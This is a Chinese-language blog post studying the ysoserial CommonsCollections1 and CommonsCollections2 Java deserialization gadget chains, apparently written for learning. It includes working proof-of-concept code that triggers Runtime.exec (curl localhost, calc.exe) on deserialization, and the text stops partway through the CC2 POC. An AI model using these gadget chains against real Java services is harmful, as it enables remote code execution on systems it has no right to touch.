<!DOCTYPE html>
<html lang="en">
  <head>
    
<meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width,user-scalable=no,initial-scale=1,minimum-scale=1,maximum-scale=1">


<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />



  <meta name="description" content="ysoserial-CommonsCollections系列学习"/>




  <meta name="keywords" content="java," />





  <link rel="alternate" href="/default" title="glotozz'blog">




  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=1.1" />



<link rel="canonical" href="https://glotozz.github.io/2020/04/14/ysoserial-CommonsCollections系列学习/"/>


<meta property="og:type" content="article">
<meta property="og:title" content="ysoserial-CommonsCollections系列学习">
<meta property="og:url" content="https://glotozz.github.io/2020/04/14/ysoserial-CommonsCollections%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0/index.html">
<meta property="og:site_name" content="glotozz&#39;blog">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://i.loli.net/2020/04/14/COFkodJmiYa1Ivu.png">
<meta property="og:image" content="https://i.loli.net/2020/04/14/4UC3JWQ5scdgNxk.png">
<meta property="og:image" content="https://i.loli.net/2020/04/14/kQOjsBL8YncfmNU.png">
<meta property="og:image" content="https://i.loli.net/2020/04/14/EPCnvTxHoe3yX4c.png">
<meta property="og:image" content="https://i.loli.net/2020/04/14/UXvKxQM9AOLzSsG.png">
<meta property="og:image" content="https://i.loli.net/2020/04/15/zwvp9cQ4xXdt7rb.png">
<meta property="og:image" content="https://i.loli.net/2020/04/15/2OVPmo9ihKQ3BYn.png">
<meta property="og:image" content="https://i.loli.net/2020/04/15/ULlpG1qboEd4J8D.png">
<meta property="og:image" content="https://i.loli.net/2020/04/15/umQBCcqRVsintbP.png">
<meta property="og:image" content="https://i.loli.net/2020/04/15/UH8enYqPSR4lbtT.png">
<meta property="og:image" content="https://i.loli.net/2020/04/15/2UyxMchTiNe8pEO.png">
<meta property="og:image" content="https://i.loli.net/2020/04/15/3uq27tXD1bTeEpv.png">
<meta property="og:image" content="https://i.loli.net/2020/04/15/lcNhiD6PetX7r8s.png">
<meta property="og:image" content="https://i.loli.net/2020/04/15/lKOYTjFQPm3cd2s.png">
<meta property="og:image" content="https://i.loli.net/2020/04/15/PE5m21eO7l6FCZt.png">
<meta property="og:image" content="https://i.loli.net/2020/04/15/ltDYwZ64d2fkeOc.png">
<meta property="article:published_time" content="2020-04-14T03:06:33.000Z">
<meta property="article:modified_time" content="2020-04-17T06:39:36.023Z">
<meta property="article:author" content="glotozz">
<meta property="article:tag" content="java">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://i.loli.net/2020/04/14/COFkodJmiYa1Ivu.png">


<link rel="stylesheet" type="text/css" href="/css/style.css?v=1.1" />
<link href='https://fonts.googleapis.com/css?family=Open+Sans' rel='stylesheet'>





<script type="text/javascript">
  var themeConfig = {
    fancybox: {
      enable: false
    },
  };
</script>




  


<!--<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=0 height=0 src="https://music.163.com/song/media/outer/url?id=28592088.mp3"></iframe>--!>
<!--<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=0 height=0 src="/57a2_fa12_13ff_c310c1889d0f14b24334ad7afef6b9b1.mp3"></iframe>--!>
<!--<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=0 height=0 src="https://music.163.com/outchain/player?type=2&id=574288806&auto=0&height=66"></iframe>--!>
    <title> ysoserial-CommonsCollections系列学习 - glotozz'blog </title>
  <meta name="generator" content="Hexo 4.2.0"></head>

  <body>
    <div id="page">
      <header id="masthead"><div class="site-header-inner">
    <h1 class="site-title">
        <a href="/." class="logo">glotozz'blog</a>
    </h1>

    <nav id="nav-top">
        
            <ul id="menu-top" class="nav-top-items">
                
                    <li class="menu-item">
                        <a href="/archives">
                            
                            
                                Archives
                            
                        </a>
                    </li>
                
                    <li class="menu-item">
                        <a href="/about">
                            
                            
                                About
                            
                        </a>
                    </li>
                
                    <li class="menu-item">
                        <a href="/read">
                            
                            
                                Read
                            
                        </a>
                    </li>
                
                    <li class="menu-item">
                        <a href="/stars">
                            
                            
                                Stars
                            
                        </a>
                    </li>
                
            </ul>
        
  </nav>
</div>

      </header>
      <div id="content">
        
    <div id="primary">
        
  <article class="post">
    <header class="post-header">
      <h1 class="post-title">
        
          ysoserial-CommonsCollections系列学习
        
      </h1>

      <time class="post-time">
          Apr 14 2020
      </time>
    </header>



    
            <div class="post-content">
            <meta name="referrer" content="no-referrer">
<a id="more"></a>

<p> &nbsp;  &nbsp; &nbsp;&nbsp;&nbsp;<strong>简陋的目录</strong></p>
<!-- toc -->

<ul>
<li><a href="#简单介绍">简单介绍</a></li>
<li><a href="#预备知识">预备知识</a></li>
<li><a href="#commonscollections1">CommonsCollections1</a></li>
<li><a href="#commonscollections2">CommonsCollections2</a></li>
<li><a href="#commonscollections3">CommonsCollections3</a></li>
<li><a href="#参考链接">参考链接</a></li>
</ul>
<!-- tocstop -->

<hr>
<p>之前分析过ysoserial-<code>CommonsCollections5</code>这条链，这里学习下其他的思路</p>
<h4><span id="简单介绍">简单介绍</span></h4><blockquote>
<p>Apache Commons Collections是一个扩展了Java标准库里的Collection结构的第三方基础库，它提供了很多强有力的数据结构类型并且实现了各种集合工具类。作为Apache开源项目的重要组件，Commons Collections被广泛应用于各种Java应用的开发。</p>
<p>一些Java应用程序(Weblogic，Websphere，Jboss，Jenkins，Coldfusion等)的RCE漏洞都是因为Commons-Collections的反序列化造成的。</p>
</blockquote>
<h4><span id="预备知识">预备知识</span></h4><p><strong>动态代理</strong></p>
<p>在不修改类的源码的情况下，通过代理的方式为类的方法提供更多的功能。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> java.lang.reflect;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">InvocationHandler</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> Throwable</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>demo</strong></p>
<p><code>Do接口</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.company;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Do</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">doSome</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>People类</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.company;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">People</span> <span class="keyword">implements</span> <span class="title">Do</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">doSome</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"gqy"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>DoHandler类</code>用来处理被代理对象，它必须继承<code>InvocationHandler</code>接口，并实现<code>invoke()</code>方法 </p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.company;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DoHandler</span> <span class="keyword">implements</span> <span class="title">InvocationHandler</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Object object;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">DoHandler</span><span class="params">(Object object)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.object = object;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">        <span class="comment">//在真实的对象执行之前我们可以添加自己的操作</span></span><br><span class="line">        System.out.println(<span class="string">"before invoke。。。"</span>);</span><br><span class="line">        <span class="comment">//java的反射功能，用来调用obj对象的method方法，传入参数为args</span></span><br><span class="line">        Object invoke = method.invoke(proxy, args);</span><br><span class="line">        <span class="keyword">return</span> invoke;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        People people = <span class="keyword">new</span> People();</span><br><span class="line">        <span class="comment">//代理对象的调用处理程序，我们将要代理的真实对象传入代理对象的调用处理的构造函数中，最终代理对象的调用处理程序会调用真实对象的方法</span></span><br><span class="line">        InvocationHandler handler = <span class="keyword">new</span> DoHandler(people);</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 通过Proxy类的newProxyInstance方法创建代理对象，我们来看下方法中的参数</span></span><br><span class="line"><span class="comment">         * 第一个参数：people.getClass().getClassLoader()，使用handler对象的classloader对象来加载我们的代理对象</span></span><br><span class="line"><span class="comment">         * 第二个参数：people.getClass().getInterfaces()，这里为代理类提供的接口是真实对象实现的接口，这样代理对象就能像真实对象一样调用接口中的所有方法</span></span><br><span class="line"><span class="comment">         * 第三个参数：handler，我们将代理对象关联到上面的InvocationHandler对象上</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        Do proxy = (Do) Proxy.newProxyInstance(handler.getClass().getClassLoader(), people.getClass().getInterfaces(), handler);</span><br><span class="line">        System.out.println(proxy.doSome());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>成功打印出<code>before invoke。。</code>，相当于重写了<code>doSome()</code></p>
<p><strong>javassist动态编程</strong></p>
<p> ysoserial中基本上所有的恶意object都是通过动态编程的方式生成的，通过这种方式我们可以直接对已经存在的java文件字节码进行操作，也可以在内存中动态生成Java代码，动态编译执行。</p>
<p>像CC1可以不用，但是像CC2使用javassist会方便很多。</p>
<p>关键函数功能</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;获取默认类池，只有在这个ClassPool里面已经加载的类，才能使用</span><br><span class="line">ClassPool pool &#x3D; ClassPool.getDefault();</span><br><span class="line">&#x2F;&#x2F;获取pool中的某个类</span><br><span class="line">CtClass cc &#x3D; pool.get(&quot;test.Teacher&quot;);</span><br><span class="line">&#x2F;&#x2F;为cc类设置父类</span><br><span class="line">cc.setSuperclass(pool.get(&quot;test.People&quot;));</span><br><span class="line">&#x2F;&#x2F;将动态生成类的class文件存储到path路径下</span><br><span class="line">cc.writeFile(path);</span><br><span class="line">&#x2F;&#x2F;获取类的字节码</span><br><span class="line">byte[] b&#x3D;cc.toBytecode();</span><br><span class="line">&#x2F;&#x2F;创造Point类</span><br><span class="line">CtClass cc &#x3D; pool.makeClass(&quot;Point&quot;);</span><br><span class="line">&#x2F;&#x2F;为cc类添加成员变量</span><br><span class="line">cc.addField(f);</span><br><span class="line">&#x2F;&#x2F;为cc类添加方法</span><br><span class="line">cc.addMethod(m);</span><br><span class="line">&#x2F;&#x2F;为cc类设置类名</span><br><span class="line">cc.setName(&quot;Pair&quot;);</span><br></pre></td></tr></table></figure>

<hr>
<h4><span id="commonscollections1">CommonsCollections1</span></h4><p><strong>Gadget chain</strong></p>
<p><img src="https://i.loli.net/2020/04/14/COFkodJmiYa1Ivu.png" alt="Snipaste_2020-04-14_14-27-02.png"></p>
<p><strong>适用版本</strong>： CommonsCollections3.1-3.2.1，jdk1.8以前</p>
<p>主要分析<code>LazyMap.get()</code>之前的，后面的chain不再赘述，可以看之前分析的<a href>CC5</a></p>
<p><code>\java7\jre\lib\rt.jar!\sun\reflect\annotation\AnnotationInvocationHandler.class</code></p>
<p><img src="https://i.loli.net/2020/04/14/4UC3JWQ5scdgNxk.png" alt="Snipaste_2020-04-14_15-41-13.png"></p>
<p><code>readObject()</code>方法</p>
<p><img src="https://i.loli.net/2020/04/14/kQOjsBL8YncfmNU.png" alt="Snipaste_2020-04-14_15-51-01.png"></p>
<p>没有直接能调用<code>get()</code>的地方，由于实现了<code>InvocationHandler</code>接口，跟进<code>invoke()</code>方法</p>
<p><img src="https://i.loli.net/2020/04/14/EPCnvTxHoe3yX4c.png" alt="Snipaste_2020-04-14_15-46-00.png"></p>
<p>这里<code>this.memberValues.get(var4);</code>调用了<code>get()</code>方法</p>
<p>前面构造方法中看到<code>memberValues</code>直接可控，反序列化调用<code>readObject()</code>方法，这里可以结合动态代理。</p>
<p>我们可以设置<code>this.memberValues</code>为一个<code>LazyMap</code>的代理类<code>AnnotationInvocationHandler</code>，那么执行到<code>this.memberValues.entrySet().iterator()</code>的时候，因为<code>this.memberValues</code>为代理类，所以转而执行<code>LazyMap</code>代理类<code>AnnotationInvocationHandler</code>的<code>invoke</code>方法</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">InvocationHandler annotationInvocationHandler = (InvocationHandler)ctor.newInstance(Override.class, lazyMap);</span><br><span class="line">InvocationHandler invocationHandler = (InvocationHandler)ctor.newInstance(Override.class,</span><br><span class="line">Proxy.newProxyInstance(lazyMap.getClass().getClassLoader(), lazyMap.getClass().getInterfaces(), annotationInvocationHandler));</span><br></pre></td></tr></table></figure>

<p>POC</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.company;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InstantiationException, InvocationTargetException, IOException, NoSuchFieldException </span>&#123;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="comment">//传入Runtime类</span></span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="comment">//反射调用getMethod方法，然后getMethod方法再反射调用getRuntime方法，返回Runtime.getRuntime()方法</span></span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"getMethod"</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[] &#123;String.class, Class[].class &#125;,</span><br><span class="line">                        <span class="keyword">new</span> Object[] &#123;<span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="comment">//反射调用invoke方法，然后反射执行Runtime.getRuntime()方法，返回Runtime实例化对象</span></span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[] &#123;Object.class, Object[].class &#125;,</span><br><span class="line">                        <span class="keyword">new</span> Object[] &#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="comment">//反射调用exec方法</span></span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[] &#123;String.class &#125;,</span><br><span class="line">                        <span class="keyword">new</span> Object[] &#123;<span class="string">"curl localhost:7999"</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">        Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        Map lazyMap = LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line">		</span><br><span class="line">        <span class="comment">//将proxy代理放进外层的AnnotationInvocationHandler，从而membervalues.entryset触发动态代理</span></span><br><span class="line">        String clazzName = <span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>;</span><br><span class="line">        Constructor&lt;?&gt; ctor = Class.forName(clazzName).getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">        ctor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        <span class="comment">//代理对象的调用处理程序，我们将要代理的真实对象传入代理对象的调用处理的构造函数中，最终代理对象的调用处理程序会调用真实对象的方法</span></span><br><span class="line">        InvocationHandler annotationInvocationHandler = (InvocationHandler)ctor.newInstance(Override.class, lazyMap);</span><br><span class="line">        <span class="comment">//Proxy.newProxyInstance的三个参数</span></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">          通过Proxy类的newProxyInstance方法创建代理对象，我们来看下方法中的参数</span></span><br><span class="line"><span class="comment">          第一个参数：people.getClass().getClassLoader()，使用handler对象的classloader对象来加载我们的代理对象</span></span><br><span class="line"><span class="comment">          第二个参数：people.getClass().getInterfaces()，这里为代理类提供的接口是真实对象实现的接口，这样代理对象就能像真实对象一样调用接口中的所有方法</span></span><br><span class="line"><span class="comment">          第三个参数：handler，我们将代理对象关联到上面的InvocationHandler对象上</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        InvocationHandler poc = (InvocationHandler)ctor.newInstance(Override.class, Proxy.newProxyInstance(lazyMap.getClass().getClassLoader(), lazyMap.getClass().getInterfaces(), annotationInvocationHandler));</span><br><span class="line">        <span class="comment">//序列化</span></span><br><span class="line">        File f = <span class="keyword">new</span> File(<span class="string">"poc.txt"</span>);</span><br><span class="line">        ObjectOutputStream out = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(f));</span><br><span class="line">        out.writeObject(poc);</span><br><span class="line">        out.close();</span><br><span class="line">        <span class="comment">//从文件中反序列化obj对象</span></span><br><span class="line">        FileInputStream fis = <span class="keyword">new</span> FileInputStream(<span class="string">"poc.txt"</span>);</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(fis);</span><br><span class="line">        <span class="comment">//恢复对象</span></span><br><span class="line">        ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><img src="https://i.loli.net/2020/04/14/UXvKxQM9AOLzSsG.png" alt="Snipaste_2020-04-14_18-47-50.png"></p>
<hr>
<h4><span id="commonscollections2">CommonsCollections2</span></h4><p><strong>Gadget chain</strong></p>
<p><img src="https://i.loli.net/2020/04/15/zwvp9cQ4xXdt7rb.png" alt="Snipaste_2020-04-15_10-14-03.png"></p>
<p><strong>适用版本</strong>： CommonsCollections4.0，  jdk7u21及以前。</p>
<p><code>CommonsCollections1</code>也是可以在<code>commons-collections-4.0</code>利用成功的， 因为<code>commons-collections-4.0</code>删除了<code>lazyMap</code>的<code>decorate()</code>方法 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Map lazyMap &#x3D; LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line">&#x3D;&gt;</span><br><span class="line">Map lazyMap &#x3D; LazyMap.lazyMap(innerMap,transformerChain);</span><br></pre></td></tr></table></figure>

<p>而<code>CommonsCollections2</code>无法在<code>commons-collections-3.1-3.2.1</code>中利用，因为 <code>CommonsCollections2</code>的payload中使用的<code>TransformingComparator</code>在<code>3.1-3.2.1</code>版本中还没有实现<code>Serializable接口</code>，无法被反序列化。</p>
<p>可以看到CC2的反序列化漏洞点主要还是<code>InvokerTransformer.transform()</code>，并且用到了</p>
<p><code>/org/apache/commons/collections4/comparators/TransformingComparator.class</code>中的<code>compare()</code>方法</p>
<p><img src="https://i.loli.net/2020/04/15/2OVPmo9ihKQ3BYn.png" alt="Snipaste_2020-04-15_10-52-51.png"></p>
<p>该方法实现了<code>java.util.Comparator</code>中定义的<code>compare()</code>，</p>
<p><img src="https://i.loli.net/2020/04/15/ULlpG1qboEd4J8D.png" alt="Snipaste_2020-04-15_10-59-02.png"></p>
<p>这里找到了<code>PriorityQueue</code>，定义了<code>readObject()</code></p>
<p><img src="https://i.loli.net/2020/04/15/umQBCcqRVsintbP.png" alt="Snipaste_2020-04-15_13-22-26.png"></p>
<p>跟进<code>heapify()</code></p>
<p><img src="https://i.loli.net/2020/04/15/UH8enYqPSR4lbtT.png" alt="Snipaste_2020-04-15_13-36-23.png"></p>
<p><img src="https://i.loli.net/2020/04/15/2UyxMchTiNe8pEO.png" alt="Snipaste_2020-04-15_13-37-10.png"></p>
<p><img src="https://i.loli.net/2020/04/15/3uq27tXD1bTeEpv.png" alt="Snipaste_2020-04-15_13-38-24.png"></p>
<p>调用了<code>comparator.compare()</code>方法，我们可以将<code>comparator</code>置为<code>TransformingComparator</code></p>
<p>那么再分析<code>InvokerTransformer.transform()</code>，可以反射调用类方法，这里用到了<code>fastjson1.2.24</code>中使用过的<code>com.sun.org.apache.xalan.internal.xsltc.trax.Templates</code>，参考 <a href="https://glotozz.github.io/2020/03/01/Java反序列化漏洞-FastJson1.2.24/">Java反序列化漏洞-FastJson1.2.24</a> ， 只要能调用包含恶意字节码的<code>TemplatesImpl</code>对象的利用链中的任意函数(<code>getOutputProperties、newTransformer</code>等等)，就能造成RCE</p>
<p>POC</p>
<p>ysoserial使用了<code>javassist组件</code>自动生成恶意类的<code>bytecode</code></p>
<p><code>EvalClass类</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> src.com.company;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">EvalClass</span> <span class="keyword">extends</span> <span class="title">AbstractTranslet</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">EvalClass</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">"calc.exe"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//继承AbstractTranslet需要重写下面两个方法</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM dom, SerializationHandler[] serializationHandlers)</span> <span class="keyword">throws</span> TransletException </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM dom, DTMAxisIterator dtmAxisIterator, SerializationHandler serializationHandler)</span> <span class="keyword">throws</span> TransletException </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>Poc类</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span 